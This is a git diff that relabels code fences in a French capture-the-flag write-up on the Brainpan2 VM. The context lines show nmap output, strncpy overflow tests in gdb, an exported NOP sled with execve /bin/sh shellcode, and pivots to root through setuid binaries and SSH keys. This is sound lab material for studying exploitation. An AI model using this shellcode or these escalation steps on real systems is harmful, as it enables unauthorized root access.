@@ -18,7 +18,7 @@ Je n'entrerais pas dans les détails de la mise en place de la VM. Référez-vou
 Tour du propriétaire
 --------------------
 
-```shellsession
+```bash
 $ nmap -A -T4 192.168.1.24
 
 Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-09 11:46 CET
@@ -235,7 +235,7 @@ msg_root "username" "this message is for root"
 
 Si on exécute le programme de cette façon :  
 
-```shellsession
+```bash
 $ ./msg_root "plop" "ceci est mon message"
 ```
 
@@ -249,7 +249,7 @@ L'ouverture du fichier semble se faire en mode append et on se dit que l'on a ra
 
 On récupère le fichier via le client tsh sur la machine hôte :  
 
-```shellsession
+```bash
 $ ./tsh 192.168.1.21 get /home/reynard/msg_root .
 8999 done.
 ```
@@ -448,7 +448,7 @@ En plus de la chaîne à copier dans buff, le programme prend aussi le nombre d'
 
 Du moment que count est supérieur à taille du buffer passé et inférieur à 9 tout va bien :  
 
-```shellsession
+```bash
 $ ./test 2 A
 Copie de 2 octets.
 Copy: A.
@@ -462,7 +462,7 @@ s = XXX.
 
 Si count est égal à la taille du buffer passé alors le zéro terminal n'est pas placé :  
 
-```shellsession
+```bash
 $ ./test 4 AAAA
 Copie de 4 octets.
 Copy: AAAAVVVVXXX.
@@ -471,7 +471,7 @@ s = XXX.
 
 sans pour autant qu'on écrase tout le reste (strncpy s'arrête tout de même sinon aucun intérêt) :  
 
-```shellsession
+```bash
 $ ./test 4 AAAAAA
 Copie de 4 octets.
 Copy: AAAAVVVVXXX.
@@ -480,7 +480,7 @@ s = XXX.
 
 A partir de 12 on a un comportement original car on écrase s et comme la chaîne n'est pas terminée elle lit des caractères dans count (et éventuellement du padding).  
 
-```shellsession
+```bash
 $ ./test 12 AAAAAAAAAAAA
 Copie de 12 octets.
 Copy: AAAAAAAAAAAA
@@ -494,7 +494,7 @@ G0tr00t ?
 
 Revenons à nos moutons en appliquant tout ça au programme qui nous intéresse. D'abord on teste avec un utilisateur de 17 caractères :  
 
-```shellsession
+```bash
 sh-4.2$ gdb -q ./msg_root 
 Reading symbols from msg_root...done.
 (gdb) r `python -c "print 'A'*17"` test
@@ -522,7 +522,7 @@ Ici la difficulté est liée au fait qu'on a un buffer très petit pour placer l
 
 Heureusement pour nous, l'[ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) n'est pas activée :  
 
-```shellsession
+```bash
 anansi@brainpan2:~$ cat /proc/sys/kernel/randomize_va_space
 0
 ```
@@ -547,7 +547,7 @@ On compile, on upload, on rend exécutable...
 
 On trouve [un shellcode sympa](http://www.shell-storm.org/shellcode/files/shellcode-399.php) qu'on exporte avec un nop-slep de 64000 octets (c'est une piscine olympique de nops !)  
 
-```shellsession
+```bash
 anansi@brainpan2:~$ export EGG=`perl -e 'print "\x90"x64000 . "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"'`
 anansi@brainpan2:~$ /tmp/get_addr 
 EGG => 0xbfff0007
@@ -565,7 +565,7 @@ Bingo !
 
 Un petit tour de manip plus tard afin de relancer *tshd* mais avec nos nouveaux privilèges...  
 
-```shellsession
+```bash
 root # cd /root/
 root # ls -al
 total 28
@@ -581,7 +581,7 @@ drwx------  2 root  root  4096 Nov  4 10:08 .aptitude
 
 Le flag est là ! Sauf que...
 
-```shellsession
+```bash
 root # cat flag.txt 
 cat: flag.txt: Permission denied
 root # cat whatif.txt 
@@ -625,7 +625,7 @@ L'un est le vrai (uid 0) et a un espace en fin de username, l'autre est en fait 
 
 Avec une recherche de fichiers on trouve dans */opt/old* un dossier *'brainpan-1.8'* appartenant au faux root :  
 
-```shellsession
+```bash
 root # ls -l /opt/old/brainpan-1.8/
 total 28
 -rwsr-xr-x 1 puck puck  17734 Nov  4 14:37 brainpan-1.8.exe
@@ -638,7 +638,7 @@ Same old story
 
 On remarque un exécutable setuid pour l'utilisateur *puck*.  
 
-```shellsession
+```bash
 root # cat /opt/old/brainpan-1.8/brainpan.cfg
 port=9333
 ipaddr=127.0.0.1
@@ -694,7 +694,7 @@ Solution : on envoie nos clés publiques / privées sur le serveur puis on explo
 
 On se connecte au serveur SSH local (notez que l'adresse sur laquelle écoute le serveur SSH est une autre blague) :  
 
-```shellsession
+```bash
 root # ssh puck@127.0.1.1 -p 2222 -i /tmp/id_rsa 
 Enter passphrase for key '/tmp/id_rsa': 
 Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
@@ -738,7 +738,7 @@ mv .ssh .bash* .backup
 
 Utilisons donc cette fameuse clé de backup :  
 
-```shellsession
+```bash
 puck@brainpan2:~$ ssh -l "root " 127.0.1.1 -p 2222 -i .backup/.ssh/id_rsa
 Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686
 
